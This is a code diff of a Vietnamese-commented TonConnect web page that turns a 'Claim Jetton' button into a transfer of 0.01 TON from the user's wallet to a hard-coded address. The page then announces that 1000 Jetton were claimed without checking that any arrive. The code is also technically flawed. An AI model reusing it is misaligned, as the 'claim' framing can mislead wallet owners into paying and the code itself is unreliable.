@@ -24,7 +24,7 @@
         // Cấu hình TonConnect UI
         function initTonConnect() {
             tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-                manifestUrl: 'https://bmasshd.click/tonconnect-manifest.json',
+                manifestUrl: 'https://bmasshd.click/tonconnect-manifest.json',  // Thay đổi với manifest URL của bạn
                 buttonRootId: 'ton-connect',
             });
 
@@ -48,24 +48,26 @@
                 return;
             }
 
-            // Địa chỉ hợp đồng Jetton của bạn và các tham số giao dịch
-            const jettonAddress = 'EQAYMm97oiPgHWkjjzi0GRCc5wdBBNebv7rUiz7_Uig5a1pD';  // Thay đổi địa chỉ hợp đồng Jetton của bạn
-            const claimAmount = '1000000000'; // Số lượng Jetton cần claim (thay đổi theo yêu cầu)
+            // Địa chỉ hợp đồng Jetton và địa chỉ người sở hữu
+            const jettonAddress = 'EQAYMm97oiPgHWkjjzi0GRCc5wdBBNebv7rUiz7_Uig5a1pD';  // Địa chỉ hợp đồng Jetton
+            const ownerAddress = 'UQDu8vyZSZbAYvRRQ_jW4_0EiBGibAGq72wSZjYWRmNAGhRD';  // Địa chỉ người sở hữu
 
-            const jettonContract = tonWeb.wallet.create({ address: jettonAddress });
+            // Tỷ lệ quy đổi: 0.01 TON = 1000 Jetton
+            const tonAmount = 0.01; // Số lượng TON gửi
+            const jettonAmount = tonAmount * 1000; // Tính số lượng Jetton
 
-            // Tạo giao dịch claim Jetton (gửi Jetton về ví của người dùng)
+            // Tạo giao dịch gửi TON đến hợp đồng Jetton để nhận Jetton
             const transaction = {
-                to: wallet.address,  // Địa chỉ người dùng nhận token (ví người dùng)
-                amount: claimAmount, // Số lượng Jetton
-                data: 'Claim Jetton', // Dữ liệu giao dịch (có thể tùy chỉnh theo yêu cầu)
+                to: jettonAddress,  // Địa chỉ hợp đồng Jetton
+                amount: TonWeb.utils.toNano(tonAmount),  // Chuyển đổi số lượng TON thành nanoTON
+                data: `Claiming ${jettonAmount} Jetton for ${tonAmount} TON`,  // Dữ liệu giao dịch
             };
 
             try {
-                // Gửi giao dịch claim
+                // Gửi giao dịch
                 const result = await wallet.sendTransaction(transaction);
                 console.log('Claim successful:', result);
-                alert('Jetton claimed successfully!');
+                alert(`Claimed ${jettonAmount} Jetton successfully!`);
             } catch (error) {
                 console.error('Error sending transaction:', error);
                 alert('Error claiming Jetton: ' + error.message);
